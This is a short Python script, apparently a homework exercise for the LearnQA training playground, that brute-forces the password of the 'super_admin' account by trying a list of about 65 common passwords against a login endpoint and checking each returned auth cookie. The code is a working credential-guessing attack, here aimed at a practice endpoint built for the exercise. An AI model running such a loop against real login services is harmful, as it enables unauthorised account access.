import requests

URL_LOGIN = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
URL_CHECK = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

def find_correct_password():
    passwords = [
        "password",
        "123456",
        "12345678",
        "qwerty",
        "abc123",
        "monkey",
        "1234567",
        "letmein",
        "trustno1",
        "dragon",
        "baseball",
        "111111",
        "iloveyou",
        "master",
        "sunshine",
        "ashley",
        "bailey",
        "passw0rd",
        "shadow",
        "123123",
        "654321",
        "superman",
        "qazwsx",
        "michael",
        "Football",
        "password",
        "welcome",
        "jesus",
        "ninja",
        "mustang",
        "password1",
        "123456789",
        "adobe123[a]",
        "admin",
        "1234567890",
        "photoshop[a]",
        "1234",
        "12345",
        "princess",
        "azerty",
        "0",
        "1qaz2wsx",
        "login",
        "qwertyuiop",
        "solo",
        "starwars",
        "666666",
        "!@#$%^&*",
        "charlie",
        "aa123456",
        "donald",
        "qwerty123",
        "121212",
        "flower",
        "hottie",
        "loveme",
        "zaq1zaq1",
        "hello",
        "freedom",
        "whatever",
        "1q2w3e4r",
        "555555",
        "lovely",
        "7777777",
        "888888",
        "123qwe"
    ]

    login = "super_admin"

    for password in passwords:
        response = requests.post(URL_LOGIN, data={"login": login, "password": password})

        cookie_value = response.cookies.get("auth_cookie")

        if not cookie_value:
            print(f"Cookie не найдена для пароля: {password}")
            continue

        response = requests.post(URL_CHECK, cookies={"auth_cookie": cookie_value})

        if "You are authorized" in response.text:
            print(f"Найден верный пароль: {password}")
            print(response.text)
            break


if __name__ == "__main__":
    find_correct_password()
